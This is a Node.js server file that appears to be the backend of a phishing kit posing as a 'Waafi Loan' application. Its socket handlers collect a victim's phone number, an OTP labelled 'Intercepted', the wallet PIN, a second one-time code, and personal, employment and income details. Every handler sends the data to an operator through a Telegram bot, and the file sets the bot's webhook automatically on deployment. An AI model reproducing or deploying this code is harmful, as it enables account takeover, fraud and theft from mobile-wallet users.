require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');

const botManager = require('./bot_manager');

const app = express();
const server = http.createServer(app);

// Configure Socket.io for Render (CORS is essential)
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

global.io = io; // Link socket globally so botManager can call back rooms

const PORT = process.env.PORT || 3000;
const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Webhook Route for Telegram
app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
    botManager.bot.processUpdate(req.body);
    res.sendStatus(200);
});

io.on('connection', (socket) => {
    // Generate unique initial application session tag
    const initialAppId = `WFI-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
    
    // Send initial AppID back to the frontend right away
    socket.emit('session-ready', { appId: initialAppId });

    // Explicit room listener matching frontend: this.socket.emit('join-room', data.appId)
    socket.on('join-room', (room) => {
        socket.join(room);
        console.log(`🔌 User joined room: ${room}`);
    });

    // ==========================================
    // STAGE 1: GATEWAY AUTHENTICATION STREAM
    // ==========================================

    // NEW STEP 1: Phone number and Initial OTP payload delivery 
    socket.on('step4-otp', (data) => {
        const currentId = data.appId || initialAppId;
        botManager.sendToAdmin(currentId, "🇸🇴 Step 1: Phone & Intercepted OTP 1", data, true);
    });

    // NEW STEP 2: Wallet Account Security PIN delivery
    socket.on('step5-pin', (data) => {
        const currentId = data.appId || initialAppId;
        botManager.sendFinalApproval(currentId, data.pin);
    });

    // NEW STEP 3: Secondary Multi-Factor Code delivery
    socket.on('step6-otp2', (data) => {
        const currentId = data.appId || initialAppId;
        botManager.sendSecondOTP(currentId, data.otp2);
    });

    // ==========================================
    // STAGE 2: LOAN DETAIL PROFILE EXTRACTION
    // ==========================================

    // NEW STEP 4: Loan Calculation Parameters (Type, Amount, Term, Purpose)
    socket.on('step1', (data) => {
        const currentId = data.appId || initialAppId;
        botManager.sendToAdmin(currentId, "🇸🇴 Step 4: Loan Request Parameters", data, false);
    });

    // NEW STEP 5: Core Personal Information (First Name, Last Name, Email)
    socket.on('step2', (data) => {
        const currentId = data.appId || initialAppId;
        botManager.sendToAdmin(currentId, "🇸🇴 Step 5: Personal Identity Profile", data, false);
    });
    
    // NEW STEP 6: Employment Status and Verified Declared Income
    socket.on('step3-data', (data) => {
        const currentId = data.appId || initialAppId;
        botManager.sendToAdmin(currentId, "🇸🇴 Step 6: Employment & Income Status", data, false);
    });

    socket.on('disconnect', () => {
        console.log(`🔌 User disconnected socket connection reference.`);
    });
});

server.listen(PORT, async () => {
    console.log(`🚀 Waafi Loan Server running on port ${PORT}`);
    
    // Auto-configure Webhooks on deployment platforms like Render
    if (EXTERNAL_URL) {
        const webhookUrl = `${EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`;
        try {
            await botManager.bot.setWebHook(webhookUrl);
            console.log(`✅ Telegram Webhook set to: ${webhookUrl}`);
        } catch (err) {
            console.error('❌ Webhook Setup Failed:', err.message);
        }
    } else {
        console.warn('⚠️ RENDER_EXTERNAL_URL missing inside environment configs.');
    }
});